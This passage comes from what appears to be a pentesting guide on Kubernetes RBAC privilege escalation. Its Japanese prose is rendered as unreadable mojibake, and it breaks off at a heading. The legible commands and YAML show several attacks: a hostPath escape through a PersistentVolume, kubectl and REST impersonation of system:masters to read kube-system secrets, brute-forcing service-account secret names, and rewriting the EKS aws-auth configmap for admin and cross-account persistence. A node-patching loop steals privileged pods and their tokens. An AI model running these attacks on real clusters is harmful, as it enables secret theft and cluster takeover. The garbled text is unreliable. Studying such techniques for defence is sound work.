[**ã“ã®ç ”ç©¶**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html)ã«è¨˜è¼‰ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«ã€ä¿è­·ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ï¼š
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
ãƒ›ã‚¹ãƒˆãƒ‘ã‚¹ãƒã‚¦ãƒ³ãƒˆã®ä»£ã‚ã‚Šã«ã€PersistentVolumeã¨PersistentVolumeClaimã‚’ä½¿ç”¨ã—ã¦ã€æ›¸ãè¾¼ã¿å¯èƒ½ãªã‚¢ã‚¯ã‚»ã‚¹ã§ã‚³ãƒ³ãƒ†ãƒŠå†…ã«ãƒ›ã‚¹ãƒˆãƒ•ã‚©ãƒ«ãƒ€ã‚’ãƒã‚¦ãƒ³ãƒˆã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦ã€å‰ã®ã‚ˆã†ãªã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã‚’é˜²ãã“ã¨ã‚’ç›®çš„ã¨ã—ã¦ã„ã¾ã—ãŸã€‚
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **ç‰¹æ¨©ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®ãªã‚Šã™ã¾ã—**

[**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãªã‚Šã™ã¾ã—**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation)æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€ç‰¹æ¨©ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ãªã‚Šã™ã¾ã™ã“ã¨ãŒã§ãã¾ã™ã€‚

`kubectl`ã‚³ãƒãƒ³ãƒ‰ã§`--as=<username>`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’ä½¿ç”¨ã—ã¦ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ãªã‚Šã™ã¾ã™ã‹ã€`--as-group=<group>`ã‚’ä½¿ç”¨ã—ã¦ã‚°ãƒ«ãƒ¼ãƒ—ã«ãªã‚Šã™ã¾ã™ã ã‘ã§ã™ï¼š
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
ã¾ãŸã¯REST APIã‚’ä½¿ç”¨ã—ã¾ã™ï¼š
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Secretsã®ãƒªã‚¹ãƒˆ

**ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’ãƒªã‚¹ãƒˆã™ã‚‹æ¨©é™ã¯ã€æ”»æ’ƒè€…ãŒå®Ÿéš›ã«ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’èª­ã¿å–ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™** REST APIã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã§:
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã®èª­ã¿å–ã‚Š â€“ ãƒˆãƒ¼ã‚¯ãƒ³IDã®ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹æ”»æ’ƒ

èª­ã¿å–ã‚Šæ¨©é™ã‚’æŒã¤ãƒˆãƒ¼ã‚¯ãƒ³ã‚’æ‰€æŒã—ã¦ã„ã‚‹æ”»æ’ƒè€…ã¯ã€ãã‚Œã‚’ä½¿ç”¨ã™ã‚‹ãŸã‚ã«ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã®æ­£ç¢ºãªåå‰ã‚’å¿…è¦ã¨ã—ã¾ã™ãŒã€ã‚ˆã‚Šåºƒç¯„ãª _**ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã®ãƒªã‚¹ãƒˆè¡¨ç¤º**_ æ¨©é™ã¨ã¯ç•°ãªã‚Šã€ä¾ç„¶ã¨ã—ã¦è„†å¼±æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã‚·ã‚¹ãƒ†ãƒ å†…ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã¯åˆ—æŒ™å¯èƒ½ã§ã€ãã‚Œãã‚ŒãŒã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã«é–¢é€£ä»˜ã‘ã‚‰ã‚Œã¦ã„ã¾ã™ã€‚ã“ã‚Œã‚‰ã®ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã¯ã€é™çš„ãªãƒ—ãƒ¬ãƒ•ã‚£ãƒƒã‚¯ã‚¹ã®å¾Œã«ãƒ©ãƒ³ãƒ€ãƒ ãª5æ–‡å­—ã®è‹±æ•°å­—ãƒˆãƒ¼ã‚¯ãƒ³ï¼ˆç‰¹å®šã®æ–‡å­—ã‚’é™¤ãï¼‰ã‚’æŒã¤åå‰æ§‹é€ ã‚’æŒã£ã¦ã„ã¾ã™ã€‚[ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83)ã«ã‚ˆã‚‹ã¨ã€‚

ãƒˆãƒ¼ã‚¯ãƒ³ã¯ã€ãƒ•ãƒ«ã‚¢ãƒ«ãƒ•ã‚¡ãƒ™ãƒƒãƒˆç¯„å›²ã§ã¯ãªãã€é™ã‚‰ã‚ŒãŸ27æ–‡å­—ã®ã‚»ãƒƒãƒˆï¼ˆ`bcdfghjklmnpqrstvwxz2456789`ï¼‰ã‹ã‚‰ç”Ÿæˆã•ã‚Œã¾ã™ã€‚ã“ã®åˆ¶é™ã«ã‚ˆã‚Šã€å¯èƒ½ãªçµ„ã¿åˆã‚ã›ã®ç·æ•°ã¯14,348,907ï¼ˆ27^5ï¼‰ã«æ¸›å°‘ã—ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€æ”»æ’ƒè€…ã¯æ•°æ™‚é–“ã§ãƒˆãƒ¼ã‚¯ãƒ³ã‚’æ¨æ¸¬ã™ã‚‹ãŸã‚ã«ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒç¾å®Ÿçš„ã§ã‚ã‚Šã€æ©Ÿå¯†ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦ç‰¹æ¨©ã®æ˜‡æ ¼ã«ã¤ãªãŒã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

### è¨¼æ˜æ›¸ç½²åè¦æ±‚

ãƒªã‚½ãƒ¼ã‚¹ `certificatesigningrequests` ã« **`create`** ã®å‹•è©ãŒã‚ã‚‹å ´åˆï¼ˆã¾ãŸã¯å°‘ãªãã¨ã‚‚ `certificatesigningrequests/nodeClient` ã«ï¼‰ã€‚æ–°ã—ã„ãƒãƒ¼ãƒ‰ã®æ–°ã—ã„CeSRã‚’**ä½œæˆ**ã§ãã¾ã™ã€‚

[ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã«ã‚ˆã‚‹ã¨ã€ã“ã®è¦æ±‚ã‚’è‡ªå‹•æ‰¿èªã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/)ã®ã§ã€ãã®å ´åˆã¯**è¿½åŠ ã®æ¨©é™ã¯å¿…è¦ã‚ã‚Šã¾ã›ã‚“**ã€‚ãã†ã§ãªã„å ´åˆã¯ã€è¦æ±‚ã‚’æ‰¿èªã§ãã‚‹å¿…è¦ãŒã‚ã‚Šã€ã“ã‚Œã¯ `certificatesigningrequests/approval` ã®æ›´æ–°ã¨ã€ãƒªã‚½ãƒ¼ã‚¹å `<signerNameDomain>/<signerNamePath>` ã¾ãŸã¯ `<signerNameDomain>/*` ã§ã® `signers` ã®æ‰¿èªã‚’æ„å‘³ã—ã¾ã™ã€‚

å¿…è¦ãªã™ã¹ã¦ã®æ¨©é™ã‚’æŒã¤**ãƒ­ãƒ¼ãƒ«ã®ä¾‹**ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
æ–°ã—ã„ãƒãƒ¼ãƒ‰CSRãŒæ‰¿èªã•ã‚ŒãŸã®ã§ã€ãƒãƒ¼ãƒ‰ã®ç‰¹åˆ¥ãªæ¨©é™ã‚’**æ‚ªç”¨**ã—ã¦**ç§˜å¯†ã‚’ç›—ã¿**ã€**æ¨©é™ã‚’æ˜‡æ ¼**ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

[**ã“ã®æŠ•ç¨¿**](https://www.4armed.com/blog/hacking-kubelet-on-gke/)ã¨[**ã“ã¡ã‚‰**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/)ã§ã¯ã€GKE K8s TLSãƒ–ãƒ¼ãƒˆã‚¹ãƒˆãƒ©ãƒƒãƒ—æ§‹æˆãŒ**è‡ªå‹•ç½²å**ã§è¨­å®šã•ã‚Œã¦ãŠã‚Šã€æ–°ã—ã„K8sãƒãƒ¼ãƒ‰ã®è³‡æ ¼æƒ…å ±ã‚’ç”Ÿæˆã™ã‚‹ãŸã‚ã«æ‚ªç”¨ã•ã‚Œã€ãã®å¾Œãã‚Œã‚’ä½¿ç”¨ã—ã¦ç§˜å¯†ã‚’ç›—ã‚€ã“ã¨ã§æ¨©é™ã‚’æ˜‡æ ¼ã•ã›ã¾ã™ã€‚\
**å‰è¿°ã®æ¨©é™ã‚’æŒã£ã¦ã„ã‚Œã°ã€åŒã˜ã“ã¨ãŒã§ãã¾ã™**ã€‚æœ€åˆã®ä¾‹ã¯ã€æ–°ã—ã„ãƒãƒ¼ãƒ‰ãŒã‚³ãƒ³ãƒ†ãƒŠå†…ã®ç§˜å¯†ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã®ã‚’é˜²ãã‚¨ãƒ©ãƒ¼ã‚’å›é¿ã—ã¾ã™ã€‚ãªãœãªã‚‰ã€**ãƒãƒ¼ãƒ‰ã¯è‡ªåˆ†ã«ãƒã‚¦ãƒ³ãƒˆã•ã‚ŒãŸã‚³ãƒ³ãƒ†ãƒŠã®ç§˜å¯†ã«ã®ã¿ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‹ã‚‰ã§ã™ã€‚**

ã“ã‚Œã‚’å›é¿ã™ã‚‹æ–¹æ³•ã¯ã€**èˆˆå‘³ã®ã‚ã‚‹ç§˜å¯†ãŒãƒã‚¦ãƒ³ãƒˆã•ã‚Œã¦ã„ã‚‹ã‚³ãƒ³ãƒ†ãƒŠã®ãƒãƒ¼ãƒ‰åã®ãƒãƒ¼ãƒ‰è³‡æ ¼æƒ…å ±ã‚’ä½œæˆã™ã‚‹ã“ã¨**ã§ã™ï¼ˆãŸã ã—ã€æœ€åˆã®æŠ•ç¨¿ã§ãã‚Œã‚’è¡Œã†æ–¹æ³•ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼‰ï¼š
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

EKS (AWSã«ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™) ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã® kube-system åå‰ç©ºé–“ã§ **`configmaps`** ã‚’å¤‰æ›´ã§ãã‚‹ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã¯ã€**aws-auth** configmap ã‚’ä¸Šæ›¸ãã™ã‚‹ã“ã¨ã§ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ç®¡ç†è€…æ¨©é™ã‚’å–å¾—ã§ãã¾ã™ã€‚\
å¿…è¦ãªå‹•è©ã¯ **`update`** ã¨ **`patch`** ã§ã€configmap ãŒä½œæˆã•ã‚Œã¦ã„ãªã„å ´åˆã¯ **`create`** ã§ã™ï¼š

{% code overflow="wrap" %}
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
**`aws-auth`**ã‚’ä½¿ç”¨ã—ã¦ã€**ä»–ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚¢ã‚¯ã‚»ã‚¹ã‚’æä¾›ã™ã‚‹ã“ã¨ã§**æ°¸ç¶šæ€§**ã‚’æŒãŸã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ãŸã ã—ã€`aws --profile other_account eks update-kubeconfig --name <cluster-name>`ã¯**ç•°ãªã‚‹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‹ã‚‰ã¯æ©Ÿèƒ½ã—ã¾ã›ã‚“**ã€‚ã—ã‹ã—ã€å®Ÿéš›ã«ã¯`aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing`ã¯ã€åå‰ã®ä»£ã‚ã‚Šã«ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã®ARNã‚’æŒ‡å®šã™ã‚Œã°æ©Ÿèƒ½ã—ã¾ã™ã€‚\
`kubectl`ã‚’æ©Ÿèƒ½ã•ã›ã‚‹ã«ã¯ã€**è¢«å®³è€…ã®kubeconfigã‚’è¨­å®š**ã—ã€aws exec argsã«`--profile other_account_role`ã‚’è¿½åŠ ã™ã‚‹ã ã‘ã§ã€kubectlã¯ä»–ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®ãƒ—ãƒ­ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½¿ç”¨ã—ã¦ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã—ã€AWSã«é€£çµ¡ã—ã¾ã™ã€‚
{% endhint %}

### GKEã§ã®æ¨©é™æ˜‡æ ¼

**GCPã®ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã«K8sã®æ¨©é™ã‚’å‰²ã‚Šå½“ã¦ã‚‹æ–¹æ³•ã¯2ã¤ã‚ã‚Šã¾ã™**ã€‚ã„ãšã‚Œã®å ´åˆã‚‚ã€ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã¯ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã®è³‡æ ¼æƒ…å ±ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«**`container.clusters.get`**ã®æ¨©é™ãŒå¿…è¦ã§ã™ã€‚ãã†ã§ãªã‘ã‚Œã°ã€**è‡ªåˆ†è‡ªèº«ã®kubectlè¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã‚’ç”Ÿæˆã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™**ï¼ˆæ¬¡ã®ãƒªãƒ³ã‚¯ã‚’å‚ç…§ï¼‰ã€‚

{% hint style="warning" %}
K8s APIã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«è©±ã—ã‹ã‘ã‚‹ã¨ã€**GCPèªè¨¼ãƒˆãƒ¼ã‚¯ãƒ³ãŒé€ä¿¡ã•ã‚Œã¾ã™**ã€‚ãã®å¾Œã€GCPã¯K8s APIã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’é€šã˜ã¦ã€æœ€åˆã«**ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«**ï¼ˆãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã«ã‚ˆã‚‹ï¼‰ãŒ**ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å†…ã«ã‚¢ã‚¯ã‚»ã‚¹æ¨©ã‚’æŒã£ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—**ã€æ¬¡ã«**GCP IAMã‚’ä»‹ã—ã¦ã‚¢ã‚¯ã‚»ã‚¹æ¨©ã‚’æŒã£ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã¾ã™**ã€‚\
ã‚‚ã—**ã„ãšã‚Œã‹**ãŒ**çœŸ**ã§ã‚ã‚Œã°ã€**å¿œç­”**ãŒè¿”ã•ã‚Œã¾ã™ã€‚**ãã†ã§ãªã‘ã‚Œã°**ã€**GCP IAMã‚’ä»‹ã—ã¦æ¨©é™ã‚’ä¸ãˆã‚‹**ã“ã¨ã‚’ææ¡ˆã™ã‚‹**ã‚¨ãƒ©ãƒ¼**ãŒè¡¨ç¤ºã•ã‚Œã¾ã™ã€‚
{% endhint %}

æœ€åˆã®æ–¹æ³•ã¯**GCP IAM**ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€K8sã®æ¨©é™ã«ã¯**åŒç­‰ã®GCP IAMæ¨©é™**ãŒã‚ã‚Šã¾ã™ã€‚ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ãŒãã‚Œã‚’æŒã£ã¦ã„ã‚Œã°ã€ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

2ç•ªç›®ã®æ–¹æ³•ã¯ã€**ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å†…ã§K8sã®æ¨©é™ã‚’å‰²ã‚Šå½“ã¦ã‚‹**ã“ã¨ã§ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ãã®**ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹**ã§ç‰¹å®šã—ã¾ã™ï¼ˆGCPã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’å«ã‚€ï¼‰ã€‚

### ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãƒˆãƒ¼ã‚¯ãƒ³ã®ä½œæˆ

**TokenRequests**ï¼ˆ`serviceaccounts/token`ï¼‰ã‚’**ä½œæˆã§ãã‚‹ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«**ã€‚K8s APIã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«è©±ã—ã‹ã‘ã‚‹ã¨ã€SAsï¼ˆæƒ…å ±ã¯[**ã“ã¡ã‚‰**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token_request.rego)ï¼‰ã‹ã‚‰å–å¾—ã§ãã¾ã™ã€‚

### ephemeralcontainers

**`update`**ã¾ãŸã¯**`patch`**ã®æ¨©é™ã‚’æŒã¤**`pods/ephemeralcontainers`**ã®ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã¯ã€**ä»–ã®ãƒãƒƒãƒ‰ã§ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œ**ã§ãã€ç‰¹æ¨©ã®ã‚ã‚‹securityContextã‚’æŒã¤ä¸€æ™‚çš„ãªã‚³ãƒ³ãƒ†ãƒŠã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã§**ãƒãƒ¼ãƒ‰ã‹ã‚‰æŠœã‘å‡ºã™**å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

### ValidatingWebhookConfigurationsã¾ãŸã¯MutatingWebhookConfigurations

`validatingwebhookconfigurations`ã¾ãŸã¯`mutatingwebhookconfigurations`ã«å¯¾ã—ã¦`create`ã€`update`ã€ã¾ãŸã¯`patch`ã®ã„ãšã‚Œã‹ã®å‹•è©ã‚’æŒã¤ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã¯ã€**æ¨©é™ã‚’æ˜‡æ ¼ã•ã›ã‚‹ãŸã‚ã«ãã®ã‚ˆã†ãªwebhookconfigurationsã®1ã¤ã‚’ä½œæˆã§ãã‚‹**å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

[`mutatingwebhookconfigurations`ã®ä¾‹ã«ã¤ã„ã¦ã¯ã€ã“ã®æŠ•ç¨¿ã®ã“ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã‚’ç¢ºèªã—ã¦ãã ã•ã„](./#malicious-admission-controller)ã€‚

### æ¨©é™æ˜‡æ ¼

æ¬¡ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§èª­ã‚€ã“ã¨ãŒã§ãã‚‹ã‚ˆã†ã«ï¼š[**çµ„ã¿è¾¼ã¿ã®ç‰¹æ¨©æ˜‡æ ¼é˜²æ­¢**](./#built-in-privileged-escalation-prevention)ã€ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã¯æ–°ã—ã„æ¨©é™ã‚’æŒãŸãšã«ãƒ­ãƒ¼ãƒ«ã‚„ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã®ãƒ­ãƒ¼ãƒ«ã‚’æ›´æ–°ã¾ãŸã¯ä½œæˆã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚**`roles`**ã¾ãŸã¯**`clusterroles`**ã«å¯¾ã—ã¦**`escalate`**ã®å‹•è©ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã‚’é™¤ãã¾ã™ã€‚\
ãã®å ´åˆã€å½¼ã¯ã‚ˆã‚Šè‰¯ã„æ¨©é™ã‚’æŒã¤æ–°ã—ã„ãƒ­ãƒ¼ãƒ«ã‚„ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã®ãƒ­ãƒ¼ãƒ«ã‚’æ›´æ–°/ä½œæˆã§ãã¾ã™ã€‚

### ãƒãƒ¼ãƒ‰ãƒ—ãƒ­ã‚­ã‚·

**`nodes/proxy`**ã‚µãƒ–ãƒªã‚½ãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã¯ã€Kubelet APIã‚’ä»‹ã—ã¦**ãƒãƒƒãƒ‰ã§ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œ**ã§ãã¾ã™ï¼ˆ[**ã“ã¡ã‚‰**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes_proxy.rego)ã‚’å‚ç…§ï¼‰ã€‚Kubeletèªè¨¼ã«é–¢ã™ã‚‹è©³ç´°ã¯ã“ã®ãƒšãƒ¼ã‚¸ã«ã‚ã‚Šã¾ã™ï¼š

{% content-ref url="../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

[**Kubelet APIã«èªå¯ã•ã‚ŒãŸçŠ¶æ…‹ã§RCEã‚’å–å¾—ã™ã‚‹æ–¹æ³•ã®ä¾‹ã¯ã“ã¡ã‚‰**](../pentesting-kubernetes-services/#kubelet-rce)ã€‚

### ãƒãƒƒãƒ‰ã®å‰Šé™¤ + ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ä¸å¯ã®ãƒãƒ¼ãƒ‰

**ãƒãƒƒãƒ‰ã‚’å‰Šé™¤**ã§ãã‚‹ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ï¼ˆ`pods`ãƒªã‚½ãƒ¼ã‚¹ã«å¯¾ã™ã‚‹`delete`å‹•è©ï¼‰ã€ã¾ãŸã¯**ãƒãƒƒãƒ‰ã‚’è¿½ã„å‡ºã™**ï¼ˆ`pods/eviction`ãƒªã‚½ãƒ¼ã‚¹ã«å¯¾ã™ã‚‹`create`å‹•è©ï¼‰ã€ã¾ãŸã¯**ãƒãƒƒãƒ‰ã®çŠ¶æ…‹ã‚’å¤‰æ›´**ã§ãã‚‹ï¼ˆ`pods/status`ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ï¼‰ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã¯ã€**ä»–ã®ãƒãƒ¼ãƒ‰ã‚’ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ä¸å¯ã«ã™ã‚‹**ï¼ˆ`nodes/status`ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ï¼‰ã“ã¨ãŒã§ãã€**ãƒãƒ¼ãƒ‰ã‚’å‰Šé™¤**ã§ãã‚‹ï¼ˆ`nodes`ãƒªã‚½ãƒ¼ã‚¹ã«å¯¾ã™ã‚‹`delete`å‹•è©ï¼‰å ´åˆã€ãƒãƒƒãƒ‰ã‚’åˆ¶å¾¡ã—ã¦ã„ã‚‹ã¨ã€**ä»–ã®ãƒãƒ¼ãƒ‰ã‹ã‚‰ãƒãƒƒãƒ‰ã‚’ç›—ã‚€**ã“ã¨ãŒã§ãã€ãã†ã™ã‚‹ã“ã¨ã§**ä¾µå®³ã•ã‚ŒãŸ****ãƒãƒ¼ãƒ‰**ã§**å®Ÿè¡Œã•ã‚Œ**ã€æ”»æ’ƒè€…ã¯ãã‚Œã‚‰ã®ãƒãƒƒãƒ‰ã‹ã‚‰**ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã‚€**ã“ã¨ãŒã§ãã¾ã™ã€‚

{% code overflow="wrap" %}
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### ã‚µãƒ¼ãƒ“ã‚¹ã®ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ (CVE-2020-8554)

